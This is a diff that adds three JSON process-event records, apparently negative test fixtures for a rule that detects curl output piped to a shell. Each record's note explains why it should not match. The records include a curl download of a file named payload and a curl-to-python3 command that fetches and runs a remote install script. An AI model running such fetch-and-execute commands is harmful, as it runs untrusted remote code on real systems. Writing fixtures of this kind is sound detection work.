@@ -1,0 +1,3 @@
+{"process.name":"bash","process.parent.cmdline":"curl -o /tmp/payload http://203.0.113.42/payload","User":"finance04\\agarcia","_note":"curl writing to disk — not piped to shell"}
+{"process.name":"bash","process.parent.cmdline":"echo hello | bash","User":"server01\\admin","_note":"piped to bash, but no curl/wget"}
+{"process.name":"python3","process.parent.cmdline":"curl -sL http://203.0.113.42/install.sh | python3","User":"server01\\admin","_note":"piped to python, not bash/sh"}
